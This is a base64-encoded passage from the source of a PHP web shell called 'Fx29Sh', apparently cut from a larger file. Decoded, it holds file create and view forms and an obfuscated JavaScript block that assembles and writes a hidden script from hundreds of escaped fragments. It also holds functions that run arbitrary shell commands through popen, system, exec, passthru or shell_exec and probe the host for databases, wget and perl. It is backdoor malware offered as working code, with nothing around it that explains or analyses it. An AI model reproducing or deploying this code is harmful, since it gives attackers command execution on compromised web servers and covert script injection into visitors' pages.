bmFtZT0ibWtmaWxlIiBzaXplPSI3MCIgdmFsdWU9Ijw/cGhwIGVjaG8gJGRpc3BkOyA/PiI+IDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3ZlcndyaXRlIiB2YWx1ZT0iMSIgY2hlY2tlZD4gT3ZlcndyaXRlIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iQ3JlYXRlIj4gPD9waHAgZWNobyAkd2R0OyA/PgogICAgPC9mb3JtPjwvdGQ+PC90cj4KPHRyPjx0ZCBhbGlnbj1yaWdodD5WaWV3IEZpbGU6PC90ZD4KPHRkPjxmb3JtIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPSJnb2ZpbGUiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJkIiB2YWx1ZT0iPD9waHAgZWNobyAkZGlzcGQ7ID8+Ij4KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSI3MCIgdmFsdWU9Ijw/cGhwIGVjaG8gJGRpc3BkOyA/PiI+IDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iVmlldyI+CiAgICA8L2Zvcm0+PC90ZD48L3RyPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBsYW5ndWFnZT0iamF2YXNjcmlwdCI+CjwhLS0KZkY3ZVNEOD1uZXcgQXJyYXkoKTsKZkY3ZVNEOFswXT0iJTNDc2NyaXB0JTNFJTBBZG9jdSI7CmZGN2VTRDhbMV09Im1lbnQud3JpdGUlMjh1bmUiOwpmRjdlU0Q4WzJdPSJzY2FwZSUyOCUyMiUyNTNDc2NyaSI7CmZGN2VTRDhbM109InB0JTI1MjB0eXBlJTI1M0QlMjUiOwpmRjdlU0Q4WzRdPSIyMnRleHQvamF2YXNjciI7CmZGN2VTRDhbNV09ImlwdCUyNTIyJTI1M0VkbyI7CmZGN2VTRDhbNl09ImN1bWVudC53cml0ZSUyNSI7CmZGN2VTRDhbN109IjI4JTI1MjclMjU1Q3UwMCI7CmZGN2VTRDhbOF09IjNjJTI1NUN1MDA3MyUyNTVDIjsKZkY3ZVNEOFs5XT0idTAwNjMlMjU1Q3UwMDcyIjsKZkY3ZVNEOFsxMF09IiUyNTVDdTAwNjklMjU1Q3UiOwpmRjdlU0Q4WzExXT0iMDA3MCUyNTVDdTAwNyI7CmZGN2VTRDhbMTJdPSI0JTI1NUN1MDAyMCUyNTVDIjsKZkY3ZVNEOFsxM109InUwMDc0JTI1NUN1MDA3IjsKZkY3ZVNEOFsxNF09IjklMjU1Q3UwMDcwJTI1NUN1IjsKZkY3ZVNEOFsxNV09IjAwNjUlMjU1Q3UwMDNkJTI1IjsKZkY3ZVNEOFsxNl09IjVDdTAwMjIlMjU1Q3UwIjsKZkY3ZVNEOFsxN109IjA3NCUyNTVDdTAwNjUlMjU1QyI7CmZGN2VTRDhbMThdPSJ1MDA3OCUyNTVDdTAwNzQlMjUiOwpmRjdlU0Q4WzE5XT0iNUN1MDAyZiUyNTVDdSI7CmZGN2VTRDhbMjBdPSIwMDZhJTI1NUN1MDA2MSUyNTUiOwpmRjdlU0Q4WzIxXT0iQ3UwMDc2JTI1NUN1MCI7CmZGN2VTRDhbMjJdPSIwNjElMjU1Q3UwMDczJTI1IjsKZkY3ZVNEOFsyM109IjVDdTAwNjMlMjU1Q3UwMCI7CmZGN2VTRDhbMjRdPSI3MiUyNTVDdTAwNjklMjUiOwpmRjdlU0Q4WzI1XT0iNUN1MDA3MCUyNTVDdSI7CmZGN2VTRDhbMjZdPSIwMDc0JTI1NUN1MDAyMiI7CmZGN2VTRDhbMjddPSIlMjU1Q3UwMDNlJTI1NUMiOwpmRjdlU0Q4WzI4XT0idTAwNjQlMjU1Q3UwMCI7CmZGN2VTRDhbMjldPSI2ZiUyNTVDdTAwNjMlMjU1QyI7CmZGN2VTRDhbMzBdPSJ1MDA3NSUyNTVDdTAwNiI7CmZGN2VTRDhbMzFdPSJkJTI1NUN1MDA2NSUyNTVDdSI7CmZGN2VTRDhbMzJdPSIwMDZlJTI1NUN1MDA3NCUyNTUiOwpmRjdlU0Q4WzMzXT0iQ3UwMDJlJTI1NUN1MDAiOwpmRjdlU0Q4WzM0XT0iNzclMjU1Q3UwMDcyJTI1IjsKZkY3ZVNEOFszNV09IjVDdTAwNjklMjU1Q3UiOwpmRjdlU0Q4WzM2XT0iMDA3NCUyNTVDdTAwNjUlMjUiOwpmRjdlU0Q4WzM3XT0iNUN1MDAyOCUyNTVDdTAwMiI7CmZGN2VTRDhbMzhdPSI3JTI1NUN1MDA1YyUyNTVDdSI7CmZGN2VTRDhbMzldPSIwMDc1JTI1NUN1MDAzMCI7CmZGN2VTRDhbNDBdPSIlMjU1Q3UwMDMwJTI1NUN1MCI7CmZGN2VTRDhbNDFdPSIwMzMlMjU1Q3UwMDYzJTI1IjsKZkY3ZVNEOFs0Ml09IjVDdTAwNWMlMjU1Q3UwMDciOwpmRjdlU0Q4WzQzXT0iNSUyNTVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzQ0XT0iMDAzMCUyNTVDdTAwMzUiOwpmRjdlU0Q4WzQ1XT0iJTI1NUN1MDAzMyUyNTVDIjsKZkY3ZVNEOFs0Nl09InUwMDVjJTI1NUN1MDA3NSI7CmZGN2VTRDhbNDddPSIlMjU1Q3UwMDMwJTI1NUN1IjsKZkY3ZVNEOFs0OF09IjAwMzAlMjU1Q3UwMDMiOwpmRjdlU0Q4WzQ5XT0iNCUyNTVDdTAwMzMlMjU1IjsKZkY3ZVNEOFs1MF09IkN1MDA1YyUyNTVDdTAwNyI7CmZGN2VTRDhbNTFdPSI1JTI1NUN1MDAzMCUyNTVDdSI7CmZGN2VTRDhbNTJdPSIwMDMwJTI1NUN1MDAzNSUyNTUiOwpmRjdlU0Q4WzUzXT0iQ3UwMDMyJTI1NUN1MDAiOwpmRjdlU0Q4WzU0XT0iNWMlMjU1Q3UwMDc1JTI1NUMiOwpmRjdlU0Q4WzU1XT0idTAwMzAlMjU1Q3UwMDMwJTI1IjsKZkY3ZVNEOFs1Nl09IjVDdTAwMzQlMjU1Q3UwMCI7CmZGN2VTRDhbNTddPSIzOSUyNTVDdTAwNWMlMjU1Q3UiOwpmRjdlU0Q4WzU4XT0iMDA3NSUyNTVDdTAwMzAlMjU1IjsKZkY3ZVNEOFs1OV09IkN1MDAzMCUyNTVDdTAwMyI7CmZGN2VTRDhbNjBdPSI1JTI1NUN1MDAzMCUyNTVDIjsKZkY3ZVNEOFs2MV09InUwMDVjJTI1NUN1MDA3NSI7CmZGN2VTRDhbNjJdPSIlMjU1Q3UwMDMwJTI1NUN1MDAiOwpmRjdlU0Q4WzYzXT0iMzAlMjU1Q3UwMDM1JTI1NSI7CmZGN2VTRDhbNjRdPSJDdTAwMzQlMjU1Q3UwMDUiOwpmRjdlU0Q4WzY1XT0iYyUyNTVDdTAwNzUlMjU1QyI7CmZGN2VTRDhbNjZdPSJ1MDAzMCUyNTVDdTAwMzAlMjUiOwpmRjdlU0Q4WzY3XT0iNUN1MDAzMiUyNTVDdSI7CmZGN2VTRDhbNjhdPSIwMDMwJTI1NUN1MDA1YyUyNSI7CmZGN2VTRDhbNjldPSI1Q3UwMDc1JTI1NUN1MDAiOwpmRjdlU0Q4WzcwXT0iMzAlMjU1Q3UwMDMwJTI1NSI7CmZGN2VTRDhbNzFdPSJDdTAwMzUlMjU1Q3UwMDMiOwpmRjdlU0Q4WzcyXT0iMyUyNTVDdTAwNWMlMjU1Q3UwIjsKZkY3ZVNEOFs3M109IjA3NSUyNTVDdTAwMzAiOwpmRjdlU0Q4Wzc0XT0iJTI1NUN1MDAzMCUyNTVDdTAwIjsKZkY3ZVNEOFs3NV09IjM1JTI1NUN1MDAzMiUyNSI7CmZGN2VTRDhbNzZdPSI1Q3UwMDVjJTI1NUN1MDAiOwpmRjdlU0Q4Wzc3XT0iNzUlMjU1Q3UwMDMwJTI1NUN1IjsKZkY3ZVNEOFs3OF09IjAwMzAlMjU1Q3UwMDMiOwpmRjdlU0Q4Wzc5XT0iNCUyNTVDdTAwMzMlMjU1Q3UiOwpmRjdlU0Q4WzgwXT0iMDA1YyUyNTVDdTAwNzUlMjUiOwpmRjdlU0Q4WzgxXT0iNUN1MDAzMCUyNTVDdSI7CmZGN2VTRDhbODJdPSIwMDMwJTI1NUN1MDAzMyI7CmZGN2VTRDhbODNdPSIlMjU1Q3UwMDY0JTI1NUN1MCI7CmZGN2VTRDhbODRdPSIwNWMlMjU1Q3UwMDc1JTI1IjsKZkY3ZVNEOFs4NV09IjVDdTAwMzAlMjU1Q3UwMDMiOwpmRjdlU0Q4Wzg2XT0iMCUyNTVDdTAwMzYlMjU1IjsKZkY3ZVNEOFs4N109IkN1MDAzOCUyNTVDdTAiOwpmRjdlU0Q4Wzg4XT0iMDVjJTI1NUN1MDA3NSUyNTVDIjsKZkY3ZVNEOFs4OV09InUwMDMwJTI1NUN1MDAzIjsKZkY3ZVNEOFs5MF09IjAlMjU1Q3UwMDM3JTI1NUMiOwpmRjdlU0Q4WzkxXT0idTAwMzQlMjU1Q3UwMDVjJTI1IjsKZkY3ZVNEOFs5Ml09IjVDdTAwNzUlMjU1Q3UiOwpmRjdlU0Q4WzkzXT0iMDAzMCUyNTVDdTAwMzAiOwpmRjdlU0Q4Wzk0XT0iJTI1NUN1MDAzNyUyNTVDdSI7CmZGN2VTRDhbOTVdPSIwMDM0JTI1NUN1MDA1YyUyNSI7CmZGN2VTRDhbOTZdPSI1Q3UwMDc1JTI1NUN1MDAiOwpmRjdlU0Q4Wzk3XT0iMzAlMjU1Q3UwMDMwJTI1NUN1IjsKZkY3ZVNEOFs5OF09IjAwMzclMjU1Q3UwMDMwJTI1NSI7CmZGN2VTRDhbOTldPSJDdTAwNWMlMjU1Q3UwMCI7CmZGN2VTRDhbMTAwXT0iNzUlMjU1Q3UwMDMwJTI1NSI7CmZGN2VTRDhbMTAxXT0iQ3UwMDMwJTI1NUN1MDAiOwpmRjdlU0Q4WzEwMl09IjMzJTI1NUN1MDA2MSUyNTVDdSI7CmZGN2VTRDhbMTAzXT0iMDA1YyUyNTVDdTAwNzUiOwpmRjdlU0Q4WzEwNF09IiUyNTVDdTAwMzAlMjU1QyI7CmZGN2VTRDhbMTA1XT0idTAwMzAlMjU1Q3UwMDMyJTI1IjsKZkY3ZVNEOFsxMDZdPSI1Q3UwMDY2JTI1NUN1MDAiOwpmRjdlU0Q4WzEwN109IjVjJTI1NUN1MDA3NSUyNTVDdSI7CmZGN2VTRDhbMTA4XT0iMDAzMCUyNTVDdTAwMzAlMjUiOwpmRjdlU0Q4WzEwOV09IjVDdTAwMzIlMjU1Q3UwIjsKZkY3ZVNEOFsxMTBdPSIwNjYlMjU1Q3UwMDVjIjsKZkY3ZVNEOFsxMTFdPSIlMjU1Q3UwMDc1JTI1NUN1IjsKZkY3ZVNEOFsxMTJdPSIwMDMwJTI1NUN1MDAzMCUyNSI7CmZGN2VTRDhbMTEzXT0iNUN1MDAzNiUyNTVDdTAwMyI7CmZGN2VTRDhbMTE0XT0iNCUyNTVDdTAwNWMlMjU1QyI7CmZGN2VTRDhbMTE1XT0idTAwNzUlMjU1Q3UwMDMiOwpmRjdlU0Q4WzExNl09IjAlMjU1Q3UwMDMwJTI1NUMiOwpmRjdlU0Q4WzExN109InUwMDM2JTI1NUN1MDAiOwpmRjdlU0Q4WzExOF09IjMxJTI1NUN1MDA1YyUyNTUiOwpmRjdlU0Q4WzExOV09IkN1MDA3NSUyNTVDdTAwIjsKZkY3ZVNEOFsxMjBdPSIzMCUyNTVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzEyMV09IjAwMzclMjU1Q3UwMDM0IjsKZkY3ZVNEOFsxMjJdPSIlMjU1Q3UwMDVjJTI1NUN1MDAiOwpmRjdlU0Q4WzEyM109Ijc1JTI1NUN1MDAzMCUyNTVDIjsKZkY3ZVNEOFsxMjRdPSJ1MDAzMCUyNTVDdTAwMyI7CmZGN2VTRDhbMTI1XT0iNiUyNTVDdTAwMzElMjU1IjsKZkY3ZVNEOFsxMjZdPSJDdTAwNWMlMjU1Q3UwMDciOwpmRjdlU0Q4WzEyN109IjUlMjU1Q3UwMDMwJTI1NSI7CmZGN2VTRDhbMTI4XT0iQ3UwMDMwJTI1NUN1MCI7CmZGN2VTRDhbMTI5XT0iMDMyJTI1NUN1MDA2NSI7CmZGN2VTRDhbMTMwXT0iJTI1NUN1MDA1YyUyNTVDIjsKZkY3ZVNEOFsxMzFdPSJ1MDA3NSUyNTVDdTAwMzAlMjUiOwpmRjdlU0Q4WzEzMl09IjVDdTAwMzAlMjU1Q3UwMDMiOwpmRjdlU0Q4WzEzM109IjclMjU1Q3UwMDM0JTI1NUN1MCI7CmZGN2VTRDhbMTM0XT0iMDVjJTI1NUN1MDA3NSUyNTVDIjsKZkY3ZVNEOFsxMzVdPSJ1MDAzMCUyNTVDdTAwIjsKZkY3ZVNEOFsxMzZdPSIzMCUyNTVDdTAwMzMlMjU1QyI7CmZGN2VTRDhbMTM3XT0idTAwMzAlMjU1Q3UwMDUiOwpmRjdlU0Q4WzEzOF09ImMlMjU1Q3UwMDc1JTI1NUN1IjsKZkY3ZVNEOFsxMzldPSIwMDMwJTI1NUN1MDAzIjsKZkY3ZVNEOFsxNDBdPSIwJTI1NUN1MDAzMyUyNTVDIjsKZkY3ZVNEOFsxNDFdPSJ1MDAzMCUyNTVDdTAwNSI7CmZGN2VTRDhbMTQyXT0iYyUyNTVDdTAwNzUlMjU1IjsKZkY3ZVNEOFsxNDNdPSJDdTAwMzAlMjU1Q3UwIjsKZkY3ZVNEOFsxNDRdPSIwMzAlMjU1Q3UwMDM2JTI1NUMiOwpmRjdlU0Q4WzE0NV09InUwMDYzJTI1NUN1MDA1YyI7CmZGN2VTRDhbMTQ2XT0iJTI1NUN1MDA3NSUyNTVDIjsKZkY3ZVNEOFsxNDddPSJ1MDAzMCUyNTVDdTAwIjsKZkY3ZVNEOFsxNDhdPSIzMCUyNTVDdTAwMzclMjUiOwpmRjdlU0Q4WzE0OV09IjVDdTAwMzMlMjU1Q3UwMCI7CmZGN2VTRDhbMTUwXT0iNWMlMjU1Q3UwMDc1JTI1NSI7CmZGN2VTRDhbMTUxXT0iQ3UwMDMwJTI1NUN1MDAiOwpmRjdlU0Q4WzE1Ml09IjMwJTI1NUN1MDAzMiUyNTUiOwpmRjdlU0Q4WzE1M109IkN1MDA2NSUyNTVDdTAwNWMiOwpmRjdlU0Q4WzE1NF09IiUyNTVDdTAwNzUlMjU1QyI7CmZGN2VTRDhbMTU1XT0idTAwMzAlMjU1Q3UwMCI7CmZGN2VTRDhbMTU2XT0iMzAlMjU1Q3UwMDM2JTI1NUN1IjsKZkY3ZVNEOFsxNTddPSIwMDY2JTI1NUN1MDA1YyUyNTUiOwpmRjdlU0Q4WzE1OF09IkN1MDA3NSUyNTVDdTAwIjsKZkY3ZVNEOFsxNTldPSIzMCUyNTVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzE2MF09IjAwMzclMjU1Q3UwMDMyJTI1IjsKZkY3ZVNEOFsxNjFdPSI1Q3UwMDVjJTI1NUN1MDA3IjsKZkY3ZVNEOFsxNjJdPSI1JTI1NUN1MDAzMCUyNTVDIjsKZkY3ZVNEOFsxNjNdPSJ1MDAzMCUyNTVDdTAwMzYlMjUiOwpmRjdlU0Q4WzE2NF09IjVDdTAwMzclMjU1Q3UwMCI7CmZGN2VTRDhbMTY1XT0iNWMlMjU1Q3UwMDc1JTI1NSI7CmZGN2VTRDhbMTY2XT0iQ3UwMDMwJTI1NUN1MDAzMCI7CmZGN2VTRDhbMTY3XT0iJTI1NUN1MDAzMiUyNTVDdTAwIjsKZkY3ZVNEOFsxNjhdPSI2NiUyNTVDdTAwNWMlMjU1IjsKZkY3ZVNEOFsxNjldPSJDdTAwNzUlMjU1Q3UwIjsKZkY3ZVNEOFsxNzBdPSIwMzAlMjU1Q3UwMDMwJTI1NUMiOwpmRjdlU0Q4WzE3MV09InUwMDM3JTI1NUN1MDAzNyI7CmZGN2VTRDhbMTcyXT0iJTI1NUN1MDA1YyUyNTVDdSI7CmZGN2VTRDhbMTczXT0iMDA3NSUyNTVDdTAwMzAlMjUiOwpmRjdlU0Q4WzE3NF09IjVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzE3NV09IjAwMzYlMjU1Q3UwMDM4JTI1NSI7CmZGN2VTRDhbMTc2XT0iQ3UwMDVjJTI1NUN1MDA3IjsKZkY3ZVNEOFsxNzddPSI1JTI1NUN1MDAzMCUyNTUiOwpmRjdlU0Q4WzE3OF09IkN1MDAzMCUyNTVDdTAwMzYiOwpmRjdlU0Q4WzE3OV09IiUyNTVDdTAwMzUlMjU1Q3UwMCI7CmZGN2VTRDhbMTgwXT0iNWMlMjU1Q3UwMDc1JTI1NUN1IjsKZkY3ZVNEOFsxODFdPSIwMDMwJTI1NUN1MDAzIjsKZkY3ZVNEOFsxODJdPSIwJTI1NUN1MDAzNyUyNTVDIjsKZkY3ZVNEOFsxODNdPSJ1MDAzMiUyNTVDdTAwIjsKZkY3ZVNEOFsxODRdPSI1YyUyNTVDdTAwNzUlMjU1IjsKZkY3ZVNEOFsxODVdPSJDdTAwMzAlMjU1Q3UwIjsKZkY3ZVNEOFsxODZdPSIwMzAlMjU1Q3UwMDM2JTI1IjsKZkY3ZVNEOFsxODddPSI1Q3UwMDM1JTI1NUN1MCI7CmZGN2VTRDhbMTg4XT0iMDVjJTI1NUN1MDA3NSI7CmZGN2VTRDhbMTg5XT0iJTI1NUN1MDAzMCUyNTVDdTAiOwpmRjdlU0Q4WzE5MF09IjAzMCUyNTVDdTAwMzIiOwpmRjdlU0Q4WzE5MV09IiUyNTVDdTAwNjUlMjU1Q3UiOwpmRjdlU0Q4WzE5Ml09IjAwNWMlMjU1Q3UwMDc1IjsKZkY3ZVNEOFsxOTNdPSIlMjU1Q3UwMDMwJTI1NUN1MDAiOwpmRjdlU0Q4WzE5NF09IjMwJTI1NUN1MDAzNiUyNSI7CmZGN2VTRDhbMTk1XT0iNUN1MDA2MSUyNTVDdSI7CmZGN2VTRDhbMTk2XT0iMDA1YyUyNTVDdTAwNyI7CmZGN2VTRDhbMTk3XT0iNSUyNTVDdTAwMzAlMjU1IjsKZkY3ZVNEOFsxOThdPSJDdTAwMzAlMjU1Q3UwMDM3IjsKZkY3ZVNEOFsxOTldPSIlMjU1Q3UwMDMzJTI1NUN1MCI7CmZGN2VTRDhbMjAwXT0iMDVjJTI1NUN1MDA3NSUyNTVDIjsKZkY3ZVNEOFsyMDFdPSJ1MDAzMCUyNTVDdTAwIjsKZkY3ZVNEOFsyMDJdPSIzMCUyNTVDdTAwMzMlMjU1Q3UiOwpmRjdlU0Q4WzIwM109IjAwNjUlMjU1Q3UwMDUiOwpmRjdlU0Q4WzIwNF09ImMlMjU1Q3UwMDc1JTI1NUN1IjsKZkY3ZVNEOFsyMDVdPSIwMDMwJTI1NUN1MDAzMCUyNSI7CmZGN2VTRDhbMjA2XT0iNUN1MDAzMyUyNTVDdTAwIjsKZkY3ZVNEOFsyMDddPSI2MyUyNTVDdTAwNWMlMjU1QyI7CmZGN2VTRDhbMjA4XT0idTAwNzUlMjU1Q3UwMDMwIjsKZkY3ZVNEOFsyMDldPSIlMjU1Q3UwMDMwJTI1NUN1MCI7CmZGN2VTRDhbMjEwXT0iMDMyJTI1NUN1MDA2NiUyNTUiOwpmRjdlU0Q4WzIxMV09IkN1MDA1YyUyNTVDdTAiOwpmRjdlU0Q4WzIxMl09IjA3NSUyNTVDdTAwMzAlMjUiOwpmRjdlU0Q4WzIxM109IjVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzIxNF09IjAwMzUlMjU1Q3UwMDMzJTI1NSI7CmZGN2VTRDhbMjE1XT0iQ3UwMDVjJTI1NUN1MDA3IjsKZkY3ZVNEOFsyMTZdPSI1JTI1NUN1MDAzMCUyNTVDdTAiOwpmRjdlU0Q4WzIxN109IjAzMCUyNTVDdTAwMzQlMjU1IjsKZkY3ZVNEOFsyMThdPSJDdTAwMzMlMjU1Q3UwMCI7CmZGN2VTRDhbMjE5XT0iNWMlMjU1Q3UwMDc1JTI1IjsKZkY3ZVNEOFsyMjBdPSI1Q3UwMDMwJTI1NUN1MCI7CmZGN2VTRDhbMjIxXT0iMDMwJTI1NUN1MDAzNSI7CmZGN2VTRDhbMjIyXT0iJTI1NUN1MDAzMiUyNTVDdTAiOwpmRjdlU0Q4WzIyM109IjA1YyUyNTVDdTAwNzUiOwpmRjdlU0Q4WzIyNF09IiUyNTVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzIyNV09IjAwMzAlMjU1Q3UwMDM0JTI1IjsKZkY3ZVNEOFsyMjZdPSI1Q3UwMDM5JTI1NUN1MCI7CmZGN2VTRDhbMjI3XT0iMDVjJTI1NUN1MDA3NSUyNSI7CmZGN2VTRDhbMjI4XT0iNUN1MDAzMCUyNTVDdSI7CmZGN2VTRDhbMjI5XT0iMDAzMCUyNTVDdTAwMzUlMjUiOwpmRjdlU0Q4WzIzMF09IjVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzIzMV09IjAwNWMlMjU1Q3UwMDc1JTI1NSI7CmZGN2VTRDhbMjMyXT0iQ3UwMDMwJTI1NUN1MCI7CmZGN2VTRDhbMjMzXT0iMDMwJTI1NUN1MDAzNSI7CmZGN2VTRDhbMjM0XT0iJTI1NUN1MDAzNCUyNTVDdTAiOwpmRjdlU0Q4WzIzNV09IjA1YyUyNTVDdTAwNzUiOwpmRjdlU0Q4WzIzNl09IiUyNTVDdTAwMzAlMjU1Q3UiOwpmRjdlU0Q4WzIzN109IjAwMzAlMjU1Q3UwMDMzJTI1NSI7CmZGN2VTRDhbMjM4XT0iQ3UwMDY1JTI1NUN1MCI7CmZGN2VTRDhbMjM5XT0iMDI3JTI1NUN1MDAyOSI7CmZGN2VTRDhbMjQwXT0iJTI1NUN1MDAzYyUyNTVDIjsKZkY3ZVNEOFsyNDFdPSJ1MDAyZiUyNTVDdTAwNzMlMjUiOwpmRjdlU0Q4WzI0Ml09IjVDdTAwNjMlMjU1Q3UwMDciOwpmRjdlU0Q4WzI0M109IjIlMjU1Q3UwMDY5JTI1NUN1IjsKZkY3ZVNEOFsyNDRdPSIwMDcwJTI1NUN1MDA3IjsKZkY3ZVNEOFsyNDVdPSI0JTI1NUN1MDAzZSUyNTI3JTI1IjsKZkY3ZVNEOFsyNDZdPSIyOSUyNTNDL3NjcmlwdCUyNSI7CmZGN2VTRDhbMjQ3XT0iM0UlMjIlMjklMjklM0IlMEElM0Mvc2NyaSI7CmZGN2VTRDhbMjQ4XT0icHQlM0UiOwpmb3IgKGkgPSAwOyBpIDwgZkY3ZVNEOC5sZW5ndGg7IGkgKyspCnsKICAgIGRvY3VtZW50LndyaXRlKHVuZXNjYXBlKGZGN2VTRDhbaV0pKQp9Ci8vIC0tPgo8L3NjcmlwdD4KPC90YWJsZT4KPD9waHAgZm9vdGVyKCk7ID8+CjwvYm9keT48L2h0bWw+Cjw/cGhwCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyMgRngyOVNoIENPUkUgRlVOQ1RJT05TICMjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBzYWZlbW9kZSgpIHsKICBpZiAoIEBpbmlfZ2V0KCJzYWZlX21vZGUiKSBPUiBlcmVnaSgib24iLEBpbmlfZ2V0KCJzYWZlX21vZGUiKSkgKSB7IHJldHVybiBUUlVFOyB9CiAgZWxzZSB7IHJldHVybiBGQUxTRTsgfQp9CmZ1bmN0aW9uIGdldGRpc2Z1bmMoKSB7CiAgJGRpc2Z1bmMgPSBAaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKTsKICBpZiAoIWVtcHR5KCRkaXNmdW5jKSkgewogICAgJGRpc2Z1bmMgPSBzdHJfcmVwbGFjZSgiICIsIiIsJGRpc2Z1bmMpOwogICAgJGRpc2Z1bmMgPSBleHBsb2RlKCIsIiwkZGlzZnVuYyk7CiAgfQogIGVsc2UgeyAkZGlzZnVuYz0gYXJyYXkoKTsgfQogIHJldHVybiAkZGlzZnVuYzsKfQpmdW5jdGlvbiBlbmFibGVkKCRmdW5jKSB7CiBpZiAoIGlzX2NhbGxhYmxlKCRmdW5jKSAmJiAhaW5fYXJyYXkoJGZ1bmMsZ2V0ZGlzZnVuYygpKSApIHsgcmV0dXJuIFRSVUU7IH0KIGVsc2UgeyByZXR1cm4gRkFMU0U7IH0KfQpmdW5jdGlvbiBmeDI5ZXhlYygkY21kKSB7CiAgJG91dHB1dCA9ICIiOwogIGlmICggZW5hYmxlZCgicG9wZW4iKSApIHsKICAgICRoID0gcG9wZW4oJGNtZC4nIDI+JjEnLCAncicpOwogICAgaWYgKCBpc19yZXNvdXJjZSgkaCkgKSB7CiAgICAgIHdoaWxlICggIWZlb2YoJGgpICkgeyAkb3V0cHV0IC49IGZyZWFkKCRoLCAyMDk2KTsgIH0KICAgICAgcGNsb3NlKCRoKTsKICAgIH0KICB9CiAgZWxzZWlmICggZW5hYmxlZCgicGFzc3RocnUiKSApIHsgQG9iX3N0YXJ0KCk7IHBhc3N0aHJ1KCRjbWQpOyAkb3V0cHV0ID0gQG9iX2dldF9jb250ZW50cygpOyBAb2JfZW5kX2NsZWFuKCk7IH0KICBlbHNlaWYgKCBlbmFibGVkKCJzeXN0ZW0iKSApIHsgQG9iX3N0YXJ0KCk7IHN5c3RlbSgkY21kKTsgJG91dHB1dCA9IEBvYl9nZXRfY29udGVudHMoKTsgQG9iX2VuZF9jbGVhbigpOyB9CiAgZWxzZWlmICggZW5hYmxlZCgiZXhlYyIpICkgeyBleGVjKCRjbWQsJG8pOyAkb3V0cHV0ID0gam9pbigiXHJcbiIsJG8pOyB9CiAgZWxzZWlmICggZW5hYmxlZCgic2hlbGxfZXhlYyIpICkgeyAkb3V0cHV0ID0gc2hlbGxfZXhlYygkY21kKTsgfQogIHJldHVybiAkb3V0cHV0Owp9CmZ1bmN0aW9uIGZ4MjlleGVjMigkY21kKSB7CiAgJG91dHB1dCA9ICIiOwogIGlmICggZW5hYmxlZCgic3lzdGVtIikgKSB7IEBvYl9zdGFydCgpOyBzeXN0ZW0oJGNtZCk7ICRvdXRwdXQgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7IEBvYl9lbmRfY2xlYW4oKTsgfQogIGVsc2VpZiAoIGVuYWJsZWQoImV4ZWMiKSApIHsgZXhlYygkY21kLCRvKTsgJG91dHB1dCA9IGpvaW4oIlxyXG4iLCRvKTsgfQogIGVsc2VpZiAoIGVuYWJsZWQoInNoZWxsX2V4ZWMiKSApIHsgJG91dHB1dCA9IHNoZWxsX2V4ZWMoJGNtZCk7IH0KICBlbHNlaWYgKCBlbmFibGVkKCJwYXNzdGhydSIpICkgeyBAb2Jfc3RhcnQoKTsgcGFzc3RocnUoJGNtZCk7ICRvdXRwdXQgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7IEBvYl9lbmRfY2xlYW4oKTsgfQogIGVsc2VpZiAoIGVuYWJsZWQoInBvcGVuIikgKSB7CiAgICAkaCA9IHBvcGVuKCRjbWQuJyAyPiYxJywgJ3InKTsKICAgIGlmICggaXNfcmVzb3VyY2UoJGgpICkgewogICAgICB3aGlsZSAoICFmZW9mKCRoKSApIHsgJG91dHB1dCAuPSBmcmVhZCgkaCwgMjA5Nik7ICB9CiAgICAgIHBjbG9zZSgkaCk7CiAgICB9CiAgfQogIHJldHVybiAkb3V0cHV0Owp9CmZ1bmN0aW9uIHdoaWNoKCRwcikgewogICRwYXRoID0gZngyOWV4ZWMoIndoaWNoICRwciIpOwogIGlmKCFlbXB0eSgkcGF0aCkpIHsgcmV0dXJuICRwYXRoOyB9IGVsc2UgeyByZXR1cm4gJHByOyB9Cn0KCmZ1bmN0aW9uIGdldF9zdGF0dXMoKSB7CiAgZnVuY3Rpb24gc2hvd3N0YXQoJHN1cCwkc3RhdCkgewogICAgaWYgKCRzdGF0PT0ib24iKSB7IHJldHVybiAiJHN1cDogPGZvbnQgY29sb3I9IzAwRkYwMD48Yj5PTjwvYj48L2ZvbnQ+IjsgfQogICAgZWxzZSB7IHJldHVybiAiJHN1cDogPGZvbnQgY29sb3I9I0ZGOTkwMD48Yj5PRkY8L2I+PC9mb250PiI7IH0KICB9CiAgJGFycmZ1bmMgPSBhcnJheSgKICAgIGFycmF5KCJNeVNRTCIsIm15c3FsX2Nvbm5lY3QiKSwKICAgIGFycmF5KCJNU1NRTCIsIm1zc3FsX2Nvbm5lY3QiKSwKICAgIGFycmF5KCJPcmFjbGUiLCJvY2lsb2dvbiIpLAogICAgYXJyYXkoIlBvc3RncmVTUUwiLCJwZ19jb25uZWN0IiksCiAgICBhcnJheSgiQ3VybCIsImN1cmxfdmVyc2lvbiIpLAogICk7CiAgJGFycmNtZCA9IGFycmF5KAogICAgYXJyYXkoIkZldGNoIiwiZmV0Y2ggLS1oZWxwIiksCiAgICBhcnJheSgiV2dldCIsIndnZXQgLS1oZWxwIiksCiAgICBhcnJheSgiUGVybCIsInBlcmwgLXYiKSwKICApOwoKICAkc3RhdGluZm8gPSBhcnJheSgpOwogIGZvcmVhY2ggKCRhcnJmdW5jIGFzICRmdW5jKSB7CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCRmdW5jWzFdKSkgeyAkc3RhdGluZm9bXSA9IHNob3dzdGF0KCRmdW5jWzBdLCJvbiIp